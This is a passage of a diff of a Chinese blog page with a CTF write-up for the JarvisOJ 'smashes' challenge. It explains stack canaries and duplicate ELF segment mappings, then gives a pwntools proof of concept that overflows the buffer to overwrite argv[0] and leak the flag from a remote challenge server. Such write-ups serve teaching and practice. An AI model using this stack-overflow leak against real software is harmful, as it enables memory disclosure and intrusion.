-  v4 = <span class="number">0L</span>L;
-  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400960</span>LL);                <span class="comment">// print Your name what you just input</span>
-  <span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// 读取输入，覆盖flag</span>
+    _exit(1);
+  v4 = 0LL;
+  __printf_chk(1LL, 0x400960LL);                // print Your name what you just input
+  while ( 1 )                                   // 读取输入，覆盖flag
   {
-    v5 = _IO_getc(<span class="built_in">stdin</span>);
-    <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )
-      <span class="keyword">goto</span> LABEL_9;
-    <span class="keyword">if</span> ( v5 == <span class="string">'\n'</span> )
-      <span class="keyword">break</span>;
+    v5 = _IO_getc(stdin);
+    if ( v5 == -1 )
+      goto LABEL_9;
+    if ( v5 == &#39;\n&#39; )
+      break;
     byte_600D20[v4++] = v5;
-    <span class="keyword">if</span> ( v4 == <span class="number">32</span> )
-      <span class="keyword">goto</span> LABEL_8;
+    if ( v4 == 32 )
+      goto LABEL_8;
   }
-  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v4 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v4));<span class="comment">// 将flag清零</span>
+  memset((void *)((signed int)v4 + 0x600D20LL), 0, (unsigned int)(32 - v4));// 将flag清零
 LABEL_8:
-  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);
-  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v9;
+  puts(&quot;Thank you, bye!&quot;);
+  return *MK_FP(__FS__, 40LL) ^ v9;
 }
 </code></pre>
-<p>在程序<code>data</code>段的末尾<code>0x600D20</code>处有一句提示<code>PCTF{Here',27h,'s the flag on server}</code>,提示我们flag就在此处，需要我们想办法获得，而程序后面会将flag置零</p>
+<p>在程序<code>data</code>段的末尾<code>0x600D20</code>处有一句提示<code>PCTF{Here&#39;,27h,&#39;s the flag on server}</code>,提示我们flag就在此处，需要我们想办法获得，而程序后面会将flag置零</p>
 <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg" alt=""></p>
 <p>这题看似简单，但是需要知道两个知识点才能解决</p>
 <ol>
 <li>Canary保护机制</li>
-<li>ELF文件段加载或者说内存映射关系</li>
+<li>ELF文件段加载或者说内存映射关系 </li>
 </ol>
-<h2 id="canary保护机制"><a class="markdownIt-Anchor" href="#canary保护机制"></a> Canary保护机制</h2>
-<p>对于linux下的程序保护机制，我的上篇文章也有提及Canary保护。<br>
-<code>Canary</code>，金丝雀。据说是以前矿工用金丝雀来确定地下气体是否有毒或者是否适合工作。。。但是这个名字的由来很好地跟我们解释了这个<code>Canary</code>的作用<br>
-<code>Canary</code>位置如图：</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg" alt=""><br>
-<code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
-<pre class="highlight"><code class="C"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)
+<h2 id="Canary保护机制"><a href="#Canary保护机制" class="headerlink" title="Canary保护机制"></a>Canary保护机制</h2><p>对于linux下的程序保护机制，我的上篇文章也有提及Canary保护。<br><code>Canary</code>，金丝雀。据说是以前矿工用金丝雀来确定地下气体是否有毒或者是否适合工作。。。但是这个名字的由来很好地跟我们解释了这个<code>Canary</code>的作用<br><code>Canary</code>位置如图：</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg" alt=""><br><code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
+<pre><code class="lang-C">void __attribute__ ((noreturn)) __stack_chk_fail (void)
 {
-  __fortify_fail (<span class="string">"stack smashing detected"</span>);
+  __fortify_fail (&quot;stack smashing detected&quot;);
 }
-<span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)
+void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
 {
- <span class="comment">//神奇的注释</span>
-  <span class="comment">/* The loop is added only to keep gcc happy.  */</span>
-  <span class="keyword">while</span> (<span class="number">1</span>)
-    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,
-                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);
+ //神奇的注释
+  /* The loop is added only to keep gcc happy.  */
+  while (1)
+    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
 }
 </code></pre>
-<p>大致意思就是会输入一段文字提示你程序炸了,然后这段文字里面包含一个我们感兴趣的参数<code>__libc_argv[0]</code>，这个是啥意思呢<br>
-咱们写C程序的<code>main</code>函数的时候完整写法应该是这样的:</p>
-<pre class="highlight"><code class="C"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span>
-</span></code></pre>
-<p>第一个<code>argc</code>参数是指你传入到<code>main</code>参数的个数，第二个参数<code>argv</code>,是一个指针的指针，类似于二维数组，其实可以理解为就是一个字符串数组<code>argv[0]</code>是程序路径，<code>argv[1]</code>起对应的是咱们传进<code>main</code>函数的一个个参数<br>
-<strong><code>argv[0]</code>是存储在栈上的</strong>，所以我们可以将<code>argv[0]</code>的地址换成我们想要的地址，如<code>flag</code>地址，然后程序就会输出我们想要的内容了<br>
-但是话又说回来，虽然我们可以输出任意地址的字符串，但是我们的<code>flag</code>是被覆盖了啊。俗话说<code>巧妇难为无米之炊</code>。但是我们可以通过<code>linux</code>下elf文件加载进内存的一些特性来实现我们的构想</p>
-<h2 id="elf文件段加载或者说内存映射关系"><a class="markdownIt-Anchor" href="#elf文件段加载或者说内存映射关系"></a> ELF文件段加载或者说内存映射关系</h2>
-<p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="noopener">CTF-Wiki - 程序加载</a><br>
-文中有如下一段话：<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg" alt=""><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg" alt=""></p>
+<p>大致意思就是会输入一段文字提示你程序炸了,然后这段文字里面包含一个我们感兴趣的参数<code>__libc_argv[0]</code>，这个是啥意思呢<br>咱们写C程序的<code>main</code>函数的时候完整写法应该是这样的:</p>
+<pre><code class="lang-C">int  main(int argc, const char **argv, const char **envp)
+</code></pre>
+<p>第一个<code>argc</code>参数是指你传入到<code>main</code>参数的个数，第二个参数<code>argv</code>,是一个指针的指针，类似于二维数组，其实可以理解为就是一个字符串数组<code>argv[0]</code>是程序路径，<code>argv[1]</code>起对应的是咱们传进<code>main</code>函数的一个个参数<br><strong><code>argv[0]</code>是存储在栈上的</strong>，所以我们可以将<code>argv[0]</code>的地址换成我们想要的地址，如<code>flag</code>地址，然后程序就会输出我们想要的内容了<br>但是话又说回来，虽然我们可以输出任意地址的字符串，但是我们的<code>flag</code>是被覆盖了啊。俗话说<code>巧妇难为无米之炊</code>。但是我们可以通过<code>linux</code>下elf文件加载进内存的一些特性来实现我们的构想</p>
+<h2 id="ELF文件段加载或者说内存映射关系"><a href="#ELF文件段加载或者说内存映射关系" class="headerlink" title="ELF文件段加载或者说内存映射关系"></a>ELF文件段加载或者说内存映射关系</h2><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="noopener">CTF-Wiki - 程序加载</a><br>文中有如下一段话：<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg" alt=""><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg" alt=""></p>
 <blockquote>
 <p>在这个例子中，尽管代码段和数据段在模4KB的意义下相等，但是仍然最多有4个页面包含有不纯的代码或者数据。当然，<strong>实际中会取决于页大小或者文件系统的块大小。</strong></p>
-</blockquote>
 <ul>
 <li>代码段的第一个页包含了ELF头，程序头部表，以及其他信息。</li>
 <li>代码段的最后一页包含了数据段开始部分的副本。</li>
 <li>数据段的第一页包含了代码段的最后部分的副本。至于多少，暂未说明。</li>
 <li>数据段的最后一部分可能会包含与程序运行无关的信息。</li>
 </ul>
-<blockquote>
-<p>逻辑上说，系统会对强制控制内存的权限，就好比每一个段的权限都是完全独立的；段的地址会被调整，以便于确保内存中的每一个逻辑页都只有一组类型的权限。在上面给出的例子中，<strong>文件的代码段的最后一部分和数据段的开始部分都会被映射两次：分别在数据段的虚拟地址以及代码段的虚拟地址。</strong><br>
-然后文件在内存中就会映射成这样子：</p>
+<p>逻辑上说，系统会对强制控制内存的权限，就好比每一个段的权限都是完全独立的；段的地址会被调整，以便于确保内存中的每一个逻辑页都只有一组类型的权限。在上面给出的例子中，<strong>文件的代码段的最后一部分和数据段的开始部分都会被映射两次：分别在数据段的虚拟地址以及代码段的虚拟地址。</strong><br>然后文件在内存中就会映射成这样子：</p>
 </blockquote>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg" alt=""><br>
-很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong><br>
-由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg" alt=""><br>
-且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg" alt=""><br>
-接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg" alt=""><br>
-首先随便下个断点，让程序装载就好了<br>
-然后我们寻找<code>.rodata</code>段里面的数据<code>&quot;Thank you, bye!&quot;</code><br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg" alt=""><br>
-果不其然，位于地址<code>0x40094E</code>的数据 <code>&quot;Thank you, bye!&quot;</code>在内存里面被映射了两次。<br>
-既然我们猜想实现，那么我们来尝试寻找在<code>.data</code>段里面的<code>PCTF{</code><br>
-这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg" alt=""><br>
-同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射<br>
-所以就算地址<code>0x600D20</code>处的flag被破坏，我们也能在另外一处即地址<code>0x400D20</code>找到一模一样的flag备份<br>
-那么结合我们上面说的用溢出点覆盖栈上的字符串地址<code>argv[0]</code>,然后利Canary被破坏的机制触发<code>___stack_chk_fail</code>函数将flag输出出来<br>
-我们首先得找一下溢出点到<code>argv[0]</code>的偏移<br>
-我们的溢出点，很容易发现在黄色高亮的代码处<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg" alt=""><br>
-然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处<br>
-首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code><br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg" alt=""><br>
-可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code><br>
-然后我们在&quot;name?“后面随便输入了个字符串&quot;test”,然后来到第二个断点<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg" alt=""><br>
-得到我们溢出buff的地址在<code>0x7fffffffde60</code><br>
-所以我们将地址一相减就会得到数据填充偏移<code>0x7fffffffde60-0x7fffffffe078=536</code><br>
-所以我们这样构造poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./smashes")</span>
-pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9877</span>)
-context.log_level = <span class="string">'debug'</span>
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-payload = <span class="string">"A"</span>*<span class="number">536</span>
-payload += p64(<span class="number">0x400d20</span>)
-respone(<span class="string">"name?"</span>,payload)
-respone(<span class="string">"flag:"</span>,<span class="string">"What ever you want"</span>)
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg" alt=""><br>很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong><br>由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg" alt=""><br>且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg" alt=""><br>接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg" alt=""><br>首先随便下个断点，让程序装载就好了<br>然后我们寻找<code>.rodata</code>段里面的数据<code>&quot;Thank you, bye!&quot;</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg" alt=""><br>果不其然，位于地址<code>0x40094E</code>的数据 <code>&quot;Thank you, bye!&quot;</code>在内存里面被映射了两次。<br>既然我们猜想实现，那么我们来尝试寻找在<code>.data</code>段里面的<code>PCTF{</code><br>这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg" alt=""><br>同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射<br>所以就算地址<code>0x600D20</code>处的flag被破坏，我们也能在另外一处即地址<code>0x400D20</code>找到一模一样的flag备份<br>那么结合我们上面说的用溢出点覆盖栈上的字符串地址<code>argv[0]</code>,然后利Canary被破坏的机制触发<code>___stack_chk_fail</code>函数将flag输出出来<br>我们首先得找一下溢出点到<code>argv[0]</code>的偏移<br>我们的溢出点，很容易发现在黄色高亮的代码处<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg" alt=""><br>然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处<br>首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg" alt=""><br>可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code><br>然后我们在”name?”后面随便输入了个字符串”test”,然后来到第二个断点<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg" alt=""><br>得到我们溢出buff的地址在<code>0x7fffffffde60</code><br>所以我们将地址一相减就会得到数据填充偏移<code>0x7fffffffde60-0x7fffffffe078=536</code><br>所以我们这样构造poc:</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./smashes&quot;)
+pro = remote(&quot;pwn.jarvisoj.com&quot;, 9877)
+context.log_level = &#39;debug&#39;
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+payload = &quot;A&quot;*536
+payload += p64(0x400d20)
+respone(&quot;name?&quot;,payload)
+respone(&quot;flag:&quot;,&quot;What ever you want&quot;)
 pro.interactive()
 </code></pre>
-<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg" alt=""><br>
-<strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
+<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg" alt=""><br><strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
 
         </div>
 
@@ -920,20 +788,5 @@ pro.interactive()
 <script>hljs.highlightAll();</script>
 
     </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
